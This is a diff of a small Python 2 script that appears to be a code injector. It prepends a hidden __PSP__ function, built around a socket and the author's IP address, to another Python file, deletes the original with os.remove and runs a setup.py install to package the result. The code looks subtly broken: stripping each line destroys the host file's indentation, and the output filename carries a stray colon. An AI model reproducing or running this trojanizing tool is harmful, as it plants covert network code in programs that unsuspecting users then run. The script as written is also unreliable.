@@ -1,6 +1,5 @@
-import socket
+import socket,os
 IP = socket.gethostbyname(socket.gethostname())
-f = open(raw_input("File:"))
 addcode = """
 def __PSP__():
     import socket
@@ -10,8 +9,10 @@ def __PSP__():
 __PSP__()
 """.format(IP)
 new = addcode
-with open(raw_input("File:")) as f:
+with open("oldcode.py") as f:
     for line in f:
         new =  new + line.strip()
-n = open(raw_input("New file:"),"w")
+n = open("newcode.py:","w")
 n.write(new)
+os.remove("oldcode.py")
+os.system("python setup.py install")#assumes py2exe's setup file is there
